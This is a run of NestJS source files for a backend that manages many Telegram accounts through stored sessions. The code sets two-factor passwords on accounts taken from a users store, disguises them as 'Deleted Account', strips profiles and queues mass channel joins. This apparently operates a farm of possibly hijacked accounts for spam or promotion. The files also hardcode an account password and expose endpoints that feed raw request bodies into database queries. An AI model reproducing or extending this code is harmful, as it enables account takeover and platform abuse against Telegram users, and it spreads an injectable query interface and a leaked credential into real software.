\"wordRestriction\": 0,\n        \"dMRestriction\": 0,\n        banned: false,\n        \"private\": false\n      }\n    })\n  }\n\n  async updateDefaultReactions() {\n    await this.activeChannelModel.updateMany({}, {\n      $set: {\n        reactions: [\n          '❤', '🔥', '👏', '🥰', '😁', '🤔',\n          '🤯', '😱', '🤬', '😢', '🎉', '🤩',\n          '🤮', '💩', '🙏', '👌', '🕊', '🤡',\n          '🥱', '🥴', '😍', '🐳', '❤‍🔥', '💯',\n          '🤣', '💔', '🏆', '😭', '😴', '👍',\n          '🌚', '⚡', '🍌', '😐', '💋', '👻',\n          '👀', '🙈', '🤝', '🤗', '🆒',\n          '🗿', '🙉', '🙊', '🤷', '👎'\n        ]\n      }\n    })\n  }\n}\n","import { ApiProperty,  } from '@nestjs/swagger';\n\nexport class AddReactionDto  {\n    @ApiProperty({required: true})\n    reactions: string[]\n}\n","// src/activechannels/dto/create-activechannel.dto.ts\nimport { ApiProperty } from '@nestjs/swagger';\n\nexport class CreateActiveChannelDto {\n  @ApiProperty()\n  channelId: string;\n\n  @ApiProperty({ default: false })\n  broadcast: boolean;\n\n  @ApiProperty({ default: true })\n  canSendMsgs: boolean;\n\n  @ApiProperty({ default: 300 })\n  participantsCount: number;\n\n  @ApiProperty({ default: false })\n  restricted: boolean;\n\n  @ApiProperty({ default: true })\n  sendMessages: boolean;\n\n  @ApiProperty({ default: false })\n  reactRestricted?: boolean = false;\n\n  @ApiProperty()\n  title: string;\n\n  @ApiProperty()\n  username: string;\n\n  @ApiProperty({ default: 0 })\n  wordRestriction?: number = 0;\n\n  @ApiProperty({ default: 0 })\n  dMRestriction?: number = 0;\n\n  @ApiProperty({ type: [String] })\n  availableMsgs?: string[];\n\n  @ApiProperty({\n    type: [String], default: [\n      '❤', '🔥', '👏', '🥰', '😁', '🤔',\n      '🤯', '😱', '🤬', '😢', '🎉', '🤩',\n      '🤮', '💩', '🙏', '👌', '🕊', '🤡',\n      '🥱', '🥴', '😍', '🐳', '❤‍🔥', '💯',\n      '🤣', '💔', '🏆', '😭', '😴', '👍',\n      '🌚', '⚡', '🍌', '😐', '💋', '👻',\n      '👀', '🙈', '🤝', '🤗', '🆒',\n      '🗿', '🙉', '🙊', '🤷', '👎'\n    ]\n  })\n  reactions?: string[] = [\n    '❤', '🔥', '👏', '🥰', '😁', '🤔',\n    '🤯', '😱', '🤬', '😢', '🎉', '🤩',\n    '🤮', '💩', '🙏', '👌', '🕊', '🤡',\n    '🥱', '🥴', '😍', '🐳', '❤‍🔥', '💯',\n    '🤣', '💔', '🏆', '😭', '😴', '👍',\n    '🌚', '⚡', '🍌', '😐', '💋', '👻',\n    '👀', '🙈', '🤝', '🤗', '🆒',\n    '🗿', '🙉', '🙊', '🤷', '👎'\n  ];\n\n  @ApiProperty({ default: false })\n  banned?: boolean = false;\n\n  @ApiProperty({ default: true, required: false })\n  megagroup?: boolean;\n\n  @ApiProperty({ default: false, required: false })\n  forbidden?: boolean\n\n  @ApiProperty({\n    description: 'Whether the channel is private',\n    example: false,\n    required: false,\n  })\n  private: boolean = false;\n}\n","// src/activechannels/dto/update-activechannel.dto.ts\nimport { PartialType } from '@nestjs/swagger';\nimport { CreateActiveChannelDto } from './create-active-channel.dto';\n\nexport class UpdateActiveChannelDto extends PartialType(CreateActiveChannelDto) {}\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\nimport { Document } from 'mongoose';\nimport * as mongoose from 'mongoose';\nimport { ApiProperty } from '@nestjs/swagger';\nimport { defaultMessages, defaultReactions } from '../../../utils';\n\nexport type ActiveChannelDocument = ActiveChannel & Document;\n\n@Schema({ collection: 'activeChannels', versionKey: false, autoIndex: true,\n  timestamps: true,\n  toJSON: {\n    virtuals: true,\n    transform: (doc, ret) => {\n      delete ret._id;\n    },\n  },\n })\nexport class ActiveChannel {\n  @ApiProperty({ required: true })\n  @Prop({ required: true, unique: true })\n  channelId: string;\n\n  @ApiProperty({ default: false })\n  @Prop({ default: false })\n  broadcast: boolean;\n\n  @ApiProperty({ default: true })\n  @Prop({ default: true })\n  canSendMsgs: boolean;\n\n  @ApiProperty({ type: Number, default: 0 })\n  @Prop({ type: mongoose.Schema.Types.Number, default: 0 })\n  participantsCount: number;\n\n  @ApiProperty({ default: false })\n  @Prop({ default: false })\n  restricted: boolean;\n\n  @ApiProperty({ default: false })\n  @Prop({ default: false })\n  sendMessages: boolean;\n\n  @ApiProperty({ required: true })\n  @Prop({ required: true })\n  title: string;\n\n  @ApiProperty({ required: false, default: null })\n  @Prop({ required: false, default: null })\n  username: string;\n\n  @ApiProperty({ type: Number, default: 0 })\n  @Prop({ type: mongoose.Schema.Types.Number, default: 0 })\n  wordRestriction: number;\n\n  @ApiProperty({ type: Number, default: 0 })\n  @Prop({ type: mongoose.Schema.Types.Number, default: 0 })\n  dMRestriction: number;\n\n  @ApiProperty({ type: [String], default:defaultMessages })\n  @Prop({ type: [String], default: defaultMessages })\n  availableMsgs: string[];\n\n  @ApiProperty({ type: [String], default: defaultReactions })\n  @Prop({\n    type: [String], default: defaultReactions\n  })\n  reactions: string[];\n\n  @ApiProperty({ default: false })\n  @Prop({ default: false })\n  banned: boolean;\n\n  @ApiProperty({ default: true })\n  @Prop({ default: true })\n  megagroup: boolean;\n\n  @ApiProperty({ default: false})\n  @Prop({ default: false })\n  private: boolean;\n\n  @ApiProperty({ default: false })\n  @Prop({ default: false })\n  reactRestricted: boolean\n\n  @ApiProperty({ default: false })\n  @Prop({ default: false })\n  forbidden: boolean\n}\n\nexport const ActiveChannelSchema = SchemaFactory.createForClass(ActiveChannel);\n","import { Controller, Get, Post, Body, Param, Delete, Query, Patch } from '@nestjs/common';\nimport { ApiTags, ApiOperation, ApiBody } from '@nestjs/swagger';\nimport { Client } from '../clients/schemas/client.schema';\nimport { ArchivedClientService } from './archived-client.service';\nimport { CreateClientDto } from '../clients/dto/create-client.dto';\nimport { SearchClientDto } from '../clients/dto/search-client.dto';\nimport { UpdateClientDto } from '../clients/dto/update-client.dto';\n\n@ApiTags('Archived Clients')\n@Controller('archived-clients')\nexport class ArchivedClientController {\n  constructor(private readonly archivedclientService: ArchivedClientService) { }\n\n  @Post()\n  @ApiOperation({ summary: 'Create user data' })\n  //@apiresponse({ status: 201, description: 'The user data has been successfully created.' })\n  //@apiresponse({ status: 403, description: 'Forbidden.' })\n  async create(@Body() createClientDto: CreateClientDto): Promise<Client> {\n    return this.archivedclientService.create(createClientDto);\n  }\n\n  @Get('search')\n  @ApiOperation({ summary: 'Search user data' })\n  //@apiresponse({ status: 200, description: 'Return the searched user data.' })\n  async search(@Query() query: SearchClientDto): Promise<Client[]> {\n    return this.archivedclientService.search(query);\n  }\n\n  @Get()\n  @ApiOperation({ summary: 'Get all user data' })\n  //@apiresponse({ status: 200, description: 'Return all user data.' })\n  //@apiresponse({ status: 403, description: 'Forbidden.' })\n  async findAll(): Promise<Client[]> {\n    return this.archivedclientService.findAll();\n  }\n  \n  @Get('checkArchivedClients')\n  @ApiOperation({ summary: 'Get user data by ID' })\n  //@apiresponse({ status: 200, description: 'Return the user data.' })\n  //@apiresponse({ status: 404, description: 'User data not found.' })\n  async checkArchivedClients(): Promise<string> {\n    return this.archivedclientService.checkArchivedClients();\n  }\n\n  @Get(':mobile')\n  @ApiOperation({ summary: 'Get user data by ID' })\n  //@apiresponse({ status: 200, description: 'Return the user data.' })\n  //@apiresponse({ status: 404, description: 'User data not found.' })\n  async findOne(@Param('mobile') mobile: string): Promise<Client> {\n    return this.archivedclientService.findOne(mobile);\n  }\n  \n  @Get('fetchOne/:mobile')\n  @ApiOperation({ summary: 'Get user data by ID' })\n  //@apiresponse({ status: 200, description: 'Return the user data.' })\n  //@apiresponse({ status: 404, description: 'User data not found.' })\n  async fetchOne(@Param('mobile') mobile: string): Promise<Client> {\n    return this.archivedclientService.fetchOne(mobile);\n  }\n\n  @Patch(':mobile')\n  @ApiOperation({ summary: 'Update user data by ID' })\n  //@apiresponse({ status: 200, description: 'The user data has been successfully updated.' })\n  //@apiresponse({ status: 404, description: 'User data not found.' })\n  async update(@Param('mobile') mobile: string, @Body() updateClientDto: UpdateClientDto): Promise<Client> {\n    return this.archivedclientService.update(mobile, updateClientDto);\n  }\n\n  @Delete(':mobile')\n  @ApiOperation({ summary: 'Delete user data by ID' })\n  //@apiresponse({ status: 200, description: 'The user data has been successfully deleted.' })\n  //@apiresponse({ status: 404, description: 'User data not found.' })\n  async remove(@Param('mobile') mobile: string): Promise<Client> {\n    return this.archivedclientService.remove(mobile);\n  }\n\n  @Post('query')\n  @ApiOperation({ summary: 'Execute a custom MongoDB query' })\n  //@apiresponse({ status: 200, description: 'Query executed successfully.' })\n  //@apiresponse({ status: 400, description: 'Invalid query.' })\n  //@apiresponse({ status: 500, description: 'Internal server error.' })\n  @ApiBody({type: Object})\n  async executeQuery(@Body() query: object): Promise<any> {\n    try {\n      return await this.archivedclientService.executeQuery(query);\n    } catch (error) {\n      throw error;  // You might want to handle errors more gracefully\n    }\n  }\n}\n","import { Module, forwardRef } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { ClientSchema } from '../clients/schemas/client.schema';\nimport { TelegramModule } from '../Telegram/Telegram.module';\nimport { ArchivedClientService } from './archived-client.service';\nimport { ArchivedClientController } from './archived-client.controller';\nimport { initModule } from '../ConfigurationInit/init.module';\nimport { ClientModule } from '../clients/client.module';\n\n@Module({\n  imports: [\n    initModule,\n    MongooseModule.forFeature([{ collection: 'ArchivedClients', name: 'ArchivedArchivedClientsModule', schema: ClientSchema }]),\n    forwardRef(() => TelegramModule),\n    forwardRef(() => ClientModule)\n  ],\n  controllers: [ArchivedClientController],\n  providers: [ArchivedClientService],\n  exports: [ArchivedClientService]\n})\nexport class ArchivedClientModule { }\n","import { BadRequestException, Inject, Injectable, InternalServerErrorException, NotFoundException, forwardRef } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { CreateClientDto } from '../clients/dto/create-client.dto';\nimport { Client, ClientDocument } from '../clients/schemas/client.schema';\nimport { UpdateClientDto } from '../clients/dto/update-client.dto';\nimport { TelegramService } from '../Telegram/Telegram.service';\nimport { sleep } from 'telegram/Helpers';\nimport { ClientService } from '../clients/client.service';\nimport { parseError } from '../../utils';\n\n@Injectable()\nexport class ArchivedClientService {\n    constructor(@InjectModel('ArchivedArchivedClientsModule') private archivedclientModel: Model<ClientDocument>,\n        @Inject(forwardRef(() => TelegramService))\n        private telegramService: TelegramService,\n        @Inject(forwardRef(() => ClientService))\n        private clientService: ClientService,\n    ) { }\n\n    async create(createClientDto: CreateClientDto): Promise<Client> {\n        const createdUser = new this.archivedclientModel(createClientDto);\n        return createdUser.save();\n    }\n\n    async findAll(): Promise<Client[]> {\n        const results: Client[] = await this.archivedclientModel.find().exec();\n        return results\n    }\n\n    async findOne(mobile: string): Promise<Client> {\n        const user = (await this.archivedclientModel.findOne({ mobile }).exec())?.toJSON();\n        return user;\n    }\n\n    async fetchOne(mobile: string): Promise<Client> {\n        const user = (await this.archivedclientModel.findOne({ mobile }).exec())?.toJSON();\n        if (user) {\n            return user;\n        } else {\n            try {\n                await this.telegramService.createClient(mobile, false, true)\n                const newSession = await this.telegramService.createNewSession(mobile);\n                await this.telegramService.deleteClient(mobile)\n                return await this.create({\n                    \"channelLink\": \"default\",\n                    \"clientId\": \"default\",\n                    \"dbcoll\": \"default\",\n                    \"deployKey\": \"default\",\n                    \"link\": \"default\",\n                    \"mainAccount\": \"default\",\n                    promoteRepl: \"default\",\n                    \"name\": \"default\",\n                    \"password\": \"Ajtdmwajt1@\",\n                    \"repl\": \"default\",\n                    \"session\": newSession,\n                    \"username\": \"default\",\n                    \"mobile\": mobile,\n                    product: \"default\"\n                })\n            } catch (e) {\n                await this.telegramService.deleteClient(mobile)\n                throw new NotFoundException(parseError(e).message);\n            }\n        }\n    }\n\n    async update(mobile: string, updateClientDto: UpdateClientDto): Promise<Client> {\n        delete updateClientDto[\"_id\"]\n        if ((<any>updateClientDto)._doc) {\n            delete (<any>updateClientDto)._doc['_id']\n        }\n        console.log({ ...updateClientDto });\n        const updatedUser = await this.archivedclientModel.findOneAndUpdate({ mobile }, { $set: updateClientDto }, { new: true, upsert: true }).exec();\n        return updatedUser;\n    }\n\n    async remove(mobile: string): Promise<Client> {\n        const deletedUser = await this.archivedclientModel.findOneAndDelete({ mobile }).exec();\n        if (!deletedUser) {\n            throw new NotFoundException(`Client with ID \"${mobile}\" not found`);\n        }\n        return deletedUser;\n    }\n\n    async search(filter: any): Promise<Client[]> {\n        console.log(filter)\n        if (filter.firstName) {\n            filter.firstName = { $regex: new RegExp(filter.firstName, 'i') }\n        }\n        console.log(filter)\n        return this.archivedclientModel.find(filter).exec();\n    }\n\n    async checkArchivedClients() {\n        await this.telegramService.disconnectAll()\n        await sleep(2000);\n        const archivedClients = await this.findAll();\n\n        const clients = await this.clientService.findAll();\n        const clientIds = clients.map(client => client.mobile);\n\n        archivedClients.map(async (document) => {\n            if (!clientIds.includes(document.mobile)) {\n                try {\n                    await this.telegramService.createClient(document.mobile, true, false);\n                    await this.telegramService.updateUsername(document.mobile, '');\n                    await this.telegramService.updateNameandBio(document.mobile, 'Deleted Account', '');\n                    await this.telegramService.deleteClient(document.mobile)\n                    await sleep(2000);\n                } catch (error) {\n                    console.log(document.mobile, \" :  false\");\n                    this.remove(document.mobile)\n                    await this.telegramService.deleteClient(document.mobile)\n                }\n            } else {\n                console.log(\"Number is a Active Client\")\n            }\n        })\n\n        return \"Triggered ArchiveClients check\"\n    }\n\n    async executeQuery(query: any): Promise<any> {\n        try {\n            if (!query) {\n                throw new BadRequestException('Query is invalid.');\n            }\n            return await this.archivedclientModel.find(query).exec();\n        } catch (error) {\n            throw new InternalServerErrorException(error.message);\n        }\n    }\n}\n","import { Controller, Get, Post, Body, Param, Delete, Query, Patch, Put } from '@nestjs/common';\nimport { ApiTags, ApiOperation, ApiBody, ApiParam } from '@nestjs/swagger';\nimport { BufferClientService } from './buffer-client.service';\nimport { CreateBufferClientDto } from './dto/create-buffer-client.dto';\nimport { SearchBufferClientDto } from './dto/search-buffer- client.dto';\nimport { BufferClient } from './schemas/buffer-client.schema';\nimport { UpdateBufferClientDto } from './dto/update-buffer-client.dto';\n\n@ApiTags('Buffer Clients')\n@Controller('bufferclients')\nexport class BufferClientController {\n  constructor(private readonly clientService: BufferClientService) { }\n\n  @Post()\n  @ApiOperation({ summary: 'Create user data' })\n  async create(@Body() createClientDto: CreateBufferClientDto): Promise<BufferClient> {\n    return this.clientService.create(createClientDto);\n  }\n\n  @Get('search')\n  @ApiOperation({ summary: 'Search user data' })\n  async search(@Query() query: SearchBufferClientDto): Promise<BufferClient[]> {\n    return this.clientService.search(query);\n  }\n\n  @Get('joinChannelsForBufferClients')\n  @ApiOperation({ summary: 'Join Channels for BufferClients' })\n  async joinChannelsforBufferClients(): Promise<string> {\n    return this.clientService.joinchannelForBufferClients();\n  }\n\n  @Get('checkBufferClients')\n  @ApiOperation({ summary: 'Check Buffer Clients' })\n  async checkbufferClients(): Promise<string> {\n    this.clientService.checkBufferClients();\n    return \"initiated Checking\"\n  }\n\n  @Post('addNewUserstoBufferClients')\n  @ApiOperation({ summary: 'Add New Users to Buffer Clients' })\n  @ApiBody({ type: Object })\n  async addNewUserstoBufferClients(@Body() body: { goodIds: string[], badIds: string[] }): Promise<string> {\n    this.clientService.addNewUserstoBufferClients(body.badIds, body.goodIds);\n    return \"initiated Checking\"\n  }\n\n  @Get()\n  @ApiOperation({ summary: 'Get all user data' })\n  async findAll(): Promise<BufferClient[]> {\n    return this.clientService.findAll();\n  }\n\n  @Get('SetAsBufferClient/:mobile')\n  @ApiOperation({ summary: 'Set as Buffer Client' })\n  @ApiParam({ name: 'mobile', description: 'User mobile number', type: String })\n  async setAsBufferClient(\n    @Param('mobile') mobile: string,\n  ) {\n    return await this.clientService.setAsBufferClient(mobile);\n  }\n\n  @Get(':mobile')\n  @ApiOperation({ summary: 'Get user data by ID' })\n  async findOne(@Param('mobile') mobile: string): Promise<BufferClient> {\n    return this.clientService.findOne(mobile);\n  }\n\n  @Patch(':mobile')\n  @ApiOperation({ summary: 'Update user data by ID' })\n  async update(@Param('mobile') mobile: string, @Body() updateClientDto: UpdateBufferClientDto): Promise<BufferClient> {\n    return this.clientService.update(mobile, updateClientDto);\n  }\n\n  @Put(':mobile')\n  @ApiOperation({ summary: 'Update user data by ID' })\n  async createdOrupdate(@Param('mobile') mobile: string, @Body() updateClientDto: UpdateBufferClientDto): Promise<BufferClient> {\n    return this.clientService.createOrUpdate(mobile, updateClientDto);\n  }\n\n  @Delete(':mobile')\n  @ApiOperation({ summary: 'Delete user data by ID' })\n  async remove(@Param('mobile') mobile: string): Promise<void> {\n    return this.clientService.remove(mobile);\n  }\n\n  @Post('query')\n  @ApiOperation({ summary: 'Execute a custom MongoDB query' })\n  @ApiBody({ type: Object })\n  async executeQuery(@Body() query: object): Promise<any> {\n    try {\n      return await this.clientService.executeQuery(query);\n    } catch (error) {\n      throw error;  // You might want to handle errors more gracefully\n    }\n  }\n\n}\n","import { Module, forwardRef } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { BufferClientService } from './buffer-client.service';\nimport { BufferClientController } from './buffer-client.controller';\nimport { BufferClientSchema } from './schemas/buffer-client.schema';\nimport { TelegramModule } from '../Telegram/Telegram.module';\nimport { ActiveChannelsModule } from '../active-channels/active-channels.module';\nimport { UsersModule } from '../users/users.module';\nimport { ClientModule } from '../clients/client.module';\nimport { initModule } from '../ConfigurationInit/init.module';\nimport { ChannelsModule } from '../channels/channels.module';\nimport { PromoteClientModule } from '../promote-clients/promote-client.module';\n\n@Module({\n  imports: [\n    initModule,\n    MongooseModule.forFeature([{ name: 'bufferClientModule', schema: BufferClientSchema, collection: 'bufferClients' }]),\n    forwardRef(() => TelegramModule),\n    forwardRef(() => UsersModule),\n    forwardRef(() => ActiveChannelsModule),\n    forwardRef(() => ClientModule),\n    forwardRef(() => ChannelsModule),\n    forwardRef(() => PromoteClientModule)\n ],\n  controllers: [BufferClientController],\n  providers: [BufferClientService],\n  exports: [BufferClientService]\n})\nexport class BufferClientModule { }\n","import { ChannelsService } from './../channels/channels.service';\nimport { Channel } from './../channels/schemas/channel.schema';\nimport { BadRequestException, ConflictException, HttpException, Inject, Injectable, InternalServerErrorException, NotFoundException, forwardRef } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { CreateBufferClientDto } from './dto/create-buffer-client.dto';\nimport { BufferClient, BufferClientDocument } from './schemas/buffer-client.schema';\nimport { TelegramService } from '../Telegram/Telegram.service';\nimport { sleep } from 'telegram/Helpers';\nimport { UsersService } from '../users/users.service';\nimport { ActiveChannelsService } from '../active-channels/active-channels.service';\nimport { fetchWithTimeout, parseError, ppplbot } from '../../utils';\nimport { ClientService } from '../clients/client.service';\nimport { UpdateBufferClientDto } from './dto/update-buffer-client.dto';\nimport { PromoteClientService } from '../promote-clients/promote-client.service';\n\n@Injectable()\nexport class BufferClientService {\n    private joinChannelMap: Map<string, Channel[]> = new Map();\n    private joinChannelIntervalId: NodeJS.Timeout;\n    constructor(@InjectModel('bufferClientModule') private bufferClientModel: Model<BufferClientDocument>,\n        @Inject(forwardRef(() => TelegramService))\n        private telegramService: TelegramService,\n        @Inject(forwardRef(() => UsersService))\n        private usersService: UsersService,\n        @Inject(forwardRef(() => ActiveChannelsService))\n        private activeChannelsService: ActiveChannelsService,\n        @Inject(forwardRef(() => ClientService))\n        private clientService: ClientService,\n        @Inject(forwardRef(() => ActiveChannelsService))\n        private channelsService: ChannelsService,\n        @Inject(forwardRef(() => PromoteClientService))\n        private promoteClientService: PromoteClientService,\n    ) {}\n\n    async create(bufferClient: CreateBufferClientDto): Promise<BufferClient> {\n        const newUser = new this.bufferClientModel(bufferClient);\n        return newUser.save();\n    }\n\n    async findAll(): Promise<BufferClient[]> {\n        return this.bufferClientModel.find().exec();\n    }\n\n    async findOne(mobile: string, throwErr: boolean = true): Promise<BufferClient> {\n        const user = (await this.bufferClientModel.findOne({ mobile }).exec())?.toJSON();\n        if (!user && throwErr) {\n            throw new NotFoundException(`BufferClient with mobile ${mobile} not found`);\n        }\n        return user;\n    }\n\n\n    async update(mobile: string, updateClientDto: UpdateBufferClientDto): Promise<BufferClient> {\n        const updatedUser = await this.bufferClientModel.findOneAndUpdate(\n            { mobile },\n            { $set: updateClientDto },\n            { new: true, upsert: true, returnDocument: 'after' }\n        ).exec();\n\n        if (!updatedUser) {\n            throw new NotFoundException(`User with mobile ${mobile} not found`);\n        }\n\n        return updatedUser;\n    }\n\n    async createOrUpdate(mobile: string, createOrUpdateUserDto: CreateBufferClientDto | UpdateBufferClientDto): Promise<BufferClient> {\n        const existingUser = (await this.bufferClientModel.findOne({ mobile }).exec())?.toJSON();\n        if (existingUser) {\n            console.log(\"Updating\")\n            return this.update(existingUser.mobile, createOrUpdateUserDto as UpdateBufferClientDto);\n        } else {\n            console.log(\"creating\")\n            return this.create(createOrUpdateUserDto as CreateBufferClientDto);\n        }\n    }\n\n    async remove(mobile: string): Promise<void> {\n        await fetchWithTimeout(`${ppplbot()}&text=${encodeURIComponent(`Deleting Buffer Client : ${mobile}`)}`);\n        const result = await this.bufferClientModel.deleteOne({ mobile }).exec();\n        if (result.deletedCount === 0) {\n            throw new NotFoundException(`BufferClient with mobile ${mobile} not found`);\n        }\n    }\n    async search(filter: any): Promise<BufferClient[]> {\n        console.log(filter)\n        if (filter.firstName) {\n            filter.firstName = { $regex: new RegExp(filter.firstName, 'i') }\n        }\n        console.log(filter)\n        return this.bufferClientModel.find(filter).exec();\n    }\n\n    async executeQuery(query: any, sort?: any, limit?: number, skip?: number): Promise<BufferClient[]> {\n        try {\n\n            if (!query) {\n                throw new BadRequestException('Query is invalid.');\n            }\n            const queryExec = this.bufferClientModel.find(query);\n            if (sort) {\n                queryExec.sort(sort);\n            }\n\n            if (limit) {\n                queryExec.limit(limit);\n            }\n\n            if (skip) {\n                queryExec.skip(skip);\n            }\n\n            return await queryExec.exec();\n        } catch (error) {\n            throw new InternalServerErrorException(error.message);\n        }\n    }\n\n    removeFromBufferMap(key: string) {\n        this.joinChannelMap.delete(key)\n    }\n    clearBufferMap() {\n        console.log(\"BufferMap cleared\")\n        this.joinChannelMap.clear()\n    }\n\n    async joinchannelForBufferClients(skipExisting: boolean = true): Promise<string> {\n        if (!this.telegramService.getActiveClientSetup()) {\n            console.log(\"Joining Channel Started\")\n            await this.telegramService.disconnectAll();\n            this.clearJoinChannelInterval();\n            await sleep(2000);\n            const existingkeys = skipExisting ? [] : Array.from(this.joinChannelMap.keys())\n            // const today = (new Date(Date.now())).toISOString().split('T')[0];\n            const clients = await this.bufferClientModel.find({ channels: { \"$lt\": 350 }, mobile: { $nin: existingkeys } }).sort({ channels: 1 }).limit(4);\n            if (clients.length > 0) {\n                for (const document of clients) {\n                    try {\n                        const client = await this.telegramService.createClient(document.mobile, false, false);\n                        console.log(\"Started Joining for : \", document.mobile)\n                        const channels = await client.channelInfo(true);\n                        console.log(\"Existing Channels Length : \", channels.ids.length);\n                        await this.update(document.mobile, { channels: channels.ids.length });\n                        let result = [];\n                        if (channels.canSendFalseCount < 50) {\n                            if (channels.ids.length < 220) {\n                                result = await this.channelsService.getActiveChannels(150, 0, channels.ids);\n                            } else {\n                                result = await this.activeChannelsService.getActiveChannels(150, 0, channels.ids);\n                            }\n                            this.joinChannelMap.set(document.mobile, result);\n                            await this.telegramService.deleteClient(document.mobile);\n                        } else {\n                            client.leaveChannels(channels.canSendFalseChats)\n                        }\n                        // console.log(\"DbChannelsLen: \", result.length);\n                        // let resp = '';\n                        // this.telegramService.joinChannels(document.mobile, result);\n                    } catch (error) {\n                        await this.telegramService.deleteClient(document.mobile);\n                        parseError(error)\n                    }\n                }\n                this.joinChannelQueue();\n            }\n            console.log(\"Joining Channel Triggered Succesfully for \", clients.length);\n            return `Initiated Joining channels ${clients.length}`\n        } else {\n            console.log(\"ignored active check buffer channels as active client setup exists\")\n        }\n    }\n\n    async joinChannelQueue() {\n        const existingkeys = Array.from(this.joinChannelMap.keys())\n        if (existingkeys.length > 0) {\n            this.joinChannelIntervalId = setInterval(async () => {\n                const keys = Array.from(this.joinChannelMap.keys());\n                if (keys.length > 0) {\n                    console.log(\"In JOIN CHANNEL interval: \", new Date().toISOString());\n                    for (const mobile of keys) {\n                        const channels = this.joinChannelMap.get(mobile);\n                        if (channels && channels.length > 0) {\n                            const channel = channels.shift();\n                            console.log(mobile, \" Pending Channels :\", channels.length)\n                            this.joinChannelMap.set(mobile, channels);\n                            try {\n                                await this.telegramService.createClient(mobile, false, false);\n                                console.log(mobile, \" Trying to join :\", channel.username);\n                                await this.telegramService.tryJoiningChannel(mobile, channel);\n                            } catch (error) {\n                                await this.telegramService.deleteClient(mobile);\n                                const errorDetails = parseError(error, `${mobile} @${channel.username} Outer Err ERR: `);\n                                if (error.errorMessage == 'CHANNELS_TOO_MUCH' || errorDetails.error == 'FloodWaitError') {\n                                    this.removeFromBufferMap(mobile)\n                                    const channels = await this.telegramService.getChannelInfo(mobile, true);\n                                    // await this.update(mobile, { channels: channels.ids.length });\n                                }\n                            }\n                            await this.telegramService.deleteClient(mobile);\n                        } else {\n                            this.joinChannelMap.delete(mobile);\n                        }\n                    }\n                } else {\n                    this.clearJoinChannelInterval()\n                }\n            }, 4 * 60 * 1000);\n        }\n    }\n\n    clearJoinChannelInterval() {\n        if (this.joinChannelIntervalId) {\n            clearInterval(this.joinChannelIntervalId);\n            this.joinChannelIntervalId = null;\n            setTimeout(() => {\n                this.joinchannelForBufferClients(false)\n            }, 30000);\n        }\n    }\n\n    async setAsBufferClient(\n        mobile: string,\n        availableDate: string = (new Date(Date.now() - (24 * 60 * 60 * 1000))).toISOString().split('T')[0]\n    ) {\n        const user = (await this.usersService.search({ mobile }))[0];\n        if (!user) {\n            throw new BadRequestException('user not found');\n        }\n        const isExist = await this.findOne(mobile, false)\n        if (isExist) {\n            throw new ConflictException('BufferClient already exist');\n        }\n        const clients = await this.clientService.findAll();\n        const clientMobiles = clients.map(client => client?.mobile);\n        const clientPromoteMobiles = clients.flatMap(client => client?.promoteMobile);\n        if (!clientPromoteMobiles.includes(mobile) && !clientMobiles.includes(mobile)) {\n            try {\n                const telegramClient = await this.telegramService.createClient(mobile, false)\n                await telegramClient.set2fa();\n                await sleep(15000)\n                await telegramClient.updateUsername('');\n                await sleep(3000)\n                await telegramClient.updatePrivacyforDeletedAccount();\n                await sleep(3000)\n                await telegramClient.updateProfile(\"Deleted Account\", \"Deleted Account\");\n                // await sleep(3000)\n                // await telegramClient.deleteProfilePhotos();\n                // const channels = await this.telegramService.getChannelInfo(mobile, true)\n                // const bufferClient = {\n                //     tgId: user.tgId,\n                //     session: user.session,\n                //     mobile: user.mobile,\n                //     availableDate,\n                //     channels: channels.ids.length,\n                // }\n                // await this.bufferClientModel.findOneAndUpdate({ tgId: user.tgId }, { $set: bufferClient }, { new: true, upsert: true }).exec();\n            } catch (error) {\n                const errorDetails = parseError(error)\n                throw new HttpException(errorDetails.message, parseInt(errorDetails.status))\n            }\n            await this.telegramService.deleteClient(mobile)\n            return \"Client set as buffer successfully\";\n        } else {\n            throw new BadRequestException(\"Number is a Active Client\")\n        }\n    }\n\n    async checkBufferClients() {\n        if (!this.telegramService.getActiveClientSetup()) {\n            await this.telegramService.disconnectAll()\n            await sleep(2000);\n            const bufferclients = await this.findAll();\n            let goodIds: string[] = [];\n            let badIds: string[] = [];\n            if (bufferclients.length < 70) {\n                for (let i = 0; i < 70 - bufferclients.length; i++) {\n                    badIds.push(i.toString())\n                }\n            }\n            const clients = await this.clientService.findAll();\n            const promoteclients = await this.promoteClientService.findAll();\n            const clientIds = [...clients.map(client => client.mobile), ...clients.flatMap(client => { return (client.promoteMobile) })]\n            const promoteclientIds = promoteclients.map(client => client.mobile);\n            const today = (new Date(Date.now())).toISOString().split('T')[0];\n            for (const document of bufferclients) {\n                if (!clientIds.includes(document.mobile) && !promoteclientIds.includes(document.mobile)) {\n                    try {\n                        const cli = await this.telegramService.createClient(document.mobile, true, false);\n                        const me = await cli.getMe();\n                        if (me.username) {\n                            await this.telegramService.updateUsername(document.mobile, '');\n                            await sleep(2000)\n                        }\n                        if (me.firstName !== \"Deleted Account\") {\n                            await this.telegramService.updateNameandBio(document.mobile, 'Deleted Account', '');\n                            // await this.telegramService.updatePrivacyforDeletedAccount(document.mobile);\n                            await sleep(2000)\n                        }\n                        await this.telegramService.deleteProfilePhotos(document.mobile);\n                        const hasPassword = await cli.hasPassword();\n                        if (!hasPassword) {\n                            console.log(\"Client does not have password\");\n                            badIds.push(document.mobile);\n                            // await this.remove(document.mobile);\n                        } else {\n                            // const channelinfo = await this.telegramService.getChannelInfo(document.mobile, true);\n                            // await this.bufferClientModel.findOneAndUpdate({ mobile: document.mobile }, { channels: channelinfo.ids.length })\n                            console.log(document.mobile, \" :  ALL Good\");\n                            goodIds.push(document.mobile)\n                        }\n                        await this.telegramService.deleteClient(document.mobile)\n                        await sleep(2000);\n                    } catch (error) {\n                        parseError(error);\n                        badIds.push(document.mobile);\n                        this.remove(document.mobile)\n                        await this.telegramService.deleteClient(document.mobile)\n                    }\n                } else {\n                    console.log(\"Number is a Active Client\");\n                    goodIds.push(document.mobile)\n                    this.remove(document.mobile)\n                }\n            }\n            goodIds = [...goodIds, ...clientIds, ...promoteclientIds]\n            console.log(\"GoodIds: \", goodIds.length, \"BadIds : \", badIds.length);\n            this.addNewUserstoBufferClients(badIds, goodIds);\n        } else 